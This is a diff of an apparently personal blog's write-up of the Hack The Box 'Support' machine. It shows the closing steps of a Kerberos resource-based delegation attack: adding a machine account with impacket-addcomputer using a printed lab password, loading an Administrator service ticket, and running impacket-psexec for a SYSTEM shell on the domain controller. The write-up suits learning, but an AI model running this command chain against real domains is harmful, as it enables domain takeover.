@@ -369,7 +369,7 @@ You can check out this [blog](https://hakin9.org/rbcd-attack-kerberos-resource-b
 
 First, we add a new machine to the domain using impacket addcomputer script
 
-command:```impacket-addcomputer -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful```
+command:```impacket-addcomputer -computer-name 'blackanon$' -computer-pass password -dc-ip 10.129.158.5 support/support:Ironside47pleasure40Watchful```
 
 ```
 ┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
@@ -416,7 +416,67 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 ```
 We'll update the ```KRB5CCNAME``` environment variable with the path to the Administrator.ccache file, and then run the ```klist``` command to verify that the Service Ticket is loaded.
 
-command:```export KRB5CCNAME=`pwd`/Administrator.ccache;```
+command:```export KRB5CCNAME=`pwd`/Administrator.ccache```
+command:```klist```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
+└─$ export KRB5CCNAME=`pwd`/Administrator.ccache
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
+└─$ klist 
+Ticket cache: FILE:/home/bl4ck4non/Downloads/HTB/support/Administrator.ccache
+Default principal: Administrator@support
+
+Valid starting     Expires            Service principal
+11/01/23 05:39:51  11/01/23 15:39:50  cifs/DC.support.htb@SUPPORT.HTB
+        renew until 11/02/23 05:39:50
+```
+Now, we'll add the FQDN of the DC to the our ```/etc/hosts``` file and then use impacket-psexec with Kerberos authentication to gain a SYSTEM shell on the target.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/944f8a15-71f0-4638-b914-fcc32629889f)
+
+cool cool,lets use impacket-psexec
+
+command:```impacket-psexec -k DC.support.htb```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5acf158-9529-498f-ad8d-53b1ce847b85)
+
+We have successfully pwned this box
+
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
